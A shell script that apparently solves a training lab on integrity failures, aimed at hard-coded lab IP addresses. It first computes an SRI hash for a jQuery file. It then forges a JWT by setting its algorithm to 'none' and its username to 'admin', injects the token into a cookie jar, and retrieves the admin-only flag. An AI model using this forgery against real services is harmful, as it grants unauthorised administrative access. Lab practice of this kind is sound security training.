#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.76.228"
attack_ip="10.10.239.245"

# Prepare environment
mkdir /work/ 2>/dev/null


echo "--- SOFTWARE INTEGRITY FAILURE ---"

# Retrieving script file
echo "1.1 - RETRIEVING SCRIPT"
wget -q https://code.jquery.com/jquery-1.12.4.min.js
mv jquery-1.12.4.min.js /work/8-jquery-1.12.4.min.js

# Computing hash
echo "1.2 - COMPUTING HASH"
openssl dgst -sha256 -binary /work/8-jquery-1.12.4.min.js | base64 | awk '{print "sha256-"$1}'

echo "--- DATA INTEGRITY FAILURE ---"

# Initiate session
echo "2.1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:8089" -L > /dev/null

# Computing hash
echo "2.2 - LOGIN AS GUEST AND GET TOKEN"
curl -s -X POST "http://$target_ip:8089/login" -c "/work/8-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "user=guest" -d "pass=guest" > /dev/null
TOKEN=$(grep jwt-session "/work/8-cookies.txt" | awk '{print $7}')
echo "--> Token retrieved : $TOKEN"

# Decode / transform / encode token
echo "2.3 - MODIFY TOKEN"
HEADER=$(echo "$TOKEN" | awk -F. '{print $1}' | base64 -d)
PAYLOAD=$(echo "$TOKEN" | awk -F. '{print $2}' | base64 -d)
echo "--> Decoded token header : $HEADER"
echo "--> Decoded token payload : $PAYLOAD"

MODIFIED_HEADER=$(echo "$HEADER" | jq '.alg = "none"' | tr -d '\n' | tr -d ' ')
MODIFIED_PAYLOAD=$(echo "$PAYLOAD" | jq '.username = "admin"' | tr -d '\n' | tr -d ' ')
echo "--> Modified token header : $MODIFIED_HEADER"
echo "--> Modified token payload : $MODIFIED_PAYLOAD"
ENCODED_HEADER=$(echo "$MODIFIED_HEADER"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD."
echo "--> Token modified : $UNSIGNED_TOKEN"
awk -v new_jwt="$UNSIGNED_TOKEN" 'BEGIN {OFS="\t"} {if ($6 == "jwt-session") $7 = new_jwt; print}' "/work/8-cookies.txt" > tmp && mv tmp "/work/8-cookies-admin.txt"

# Gather secret data
echo "2.4 - GATHER ADMIN DATA"
curl -s -X GET "http://$target_ip:8089/flag" -L -b /work/8-cookies-admin.txt -o /work/8-admin.html
echo "--> Flag is : $(sed -n 's/.*to\(.*\)<\/p>.*/\1/p' /work/8-admin.html)"
